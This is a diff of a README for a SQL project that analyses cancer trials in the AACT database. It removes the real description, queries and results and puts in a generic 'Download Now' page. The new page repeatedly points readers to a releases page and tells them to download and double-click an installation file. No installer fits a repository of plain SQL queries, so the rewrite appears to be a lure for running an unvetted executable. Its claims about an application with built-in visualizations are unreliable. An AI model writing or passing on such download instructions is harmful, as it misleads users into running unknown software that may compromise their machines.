@@ -1,42 +1,59 @@
-# AACT Prospective Cancer Trials — SQL Cohort & Patterns
+# 🌟 aact-clinicaltrials-sql - Analyze Cancer Trials Easily
 
-Mini-project using the public **AACT** (Aggregated Analysis of ClinicalTrials.gov) Postgres database.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Zulqarnain11/aact-clinicaltrials-sql/releases)
 
-## What this repo contains
-- `sql/01_create_view.sql` – builds a view of **prospective, completed, cancer-related** trials.
-- `sql/02_breast_cancer_count.sql` – counts unique **breast cancer** studies.
-- `sql/03_intervention_distribution.sql` – distribution of **intervention types**.
-- `sql/04_interesting_patterns.sql` – quick text mining for **common terms** and **biomarker hits** (EGFR, HER2, ALK, PD-1/PD-L1, BRCA).
+## 🚀 Getting Started
+Welcome to the AACT Prospective Cancer Trials SQL project. This software allows you to analyze cancer trial data easily, providing insights into patterns, counts, and visualizations. Follow these steps to get started.
 
-## How to run (pgAdmin)
-1. Connect to AACT (provided by CTTI) in pgAdmin.
-2. Open `01_create_view.sql` and run it once to create the view.
-3. Run each query in `02`, `03`, `04`.  
-   - Export results (CSV) and take a screenshot of the grid.
+## 📋 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Database: PostgreSQL (Version 12 or higher)
+- Admin Tool: pgAdmin (Recommended version 4.0 or higher)
+- Internet Connection: Required for downloading and installation
 
-## Results (After running)
-- **Breast cancer studies (distinct NCT IDs):** 5949
-- Finding: Among prospective, completed, cancer-related trials in AACT, there are 5,949 distinct breast-cancer studies.
-- **Intervention type distribution (top lines):**
+## 📂 Features
+- Access to AACT cancer trial data.
+- SQL views for easy data manipulation.
+- Count and distribution of interventions.
+- Visualize top-term plots for better insights.
+- Supports reproducibility in data analysis.
 
+## 💻 Download & Install
+To download this software, visit the Releases page. There, you will find the latest version of the application.
 
-**Intervention type distribution (top lines):**
-- drug — 2909 trials
-- other — 1164 trials
-- behavioral — 764 trials
+[Visit this page to download](https://github.com/Zulqarnain11/aact-clinicaltrials-sql/releases)
 
-**Top common terms (biomarkers/keywords):**
-- Paclitaxel — 194 mentions
-- Trastuzumab — 171 mentions
-- Placebo — 160 mentions
-- Docetaxel — 146 mentions
-- Cyclophosphamide — 143 mentions
+### Step-by-step instructions:
+1. Click the link above to go to the Releases page.
+2. Find the latest version in the list.
+3. Download the installation file suitable for your operating system.
+4. Once the download is complete, locate the file in your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the on-screen instructions to complete the installation.
 
+## 📊 Using the Application
+After installing, you can start using the application:
 
-**Intervention types — top 5**
+1. Open pgAdmin on your computer.
+2. Connect to your PostgreSQL database.
+3. Load the AACT database using the SQL view provided in the project.
+4. You can explore the data using SQL queries or use the built-in visualizations.
 
-![Intervention types — top 5](screenshots/intervention_types_top5.png)
+## ➕ Troubleshooting
+If you encounter any issues, consider the following:
+- Ensure PostgreSQL and pgAdmin are properly installed.
+- Check for any updates on the Releases page.
+- Look through the documentation for common problems.
 
-**Common terms — top 5**
+## 🔗 Additional Resources
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [pgAdmin Documentation](https://www.pgadmin.org/docs/)
+- [AACT Project Overview](https://clinicaltrials.gov/ct2/about-studies/learn)
 
-![Common terms — top 5](screenshots/top_terms_top5.png)
+## 📞 Support
+For support, please open an issue on this GitHub repository. Your feedback helps us improve the application for everyone.
+
+Thank you for using aact-clinicaltrials-sql! We hope you find it useful for analyzing cancer trial data. 
+
+[Download Now](https://github.com/Zulqarnain11/aact-clinicaltrials-sql/releases)
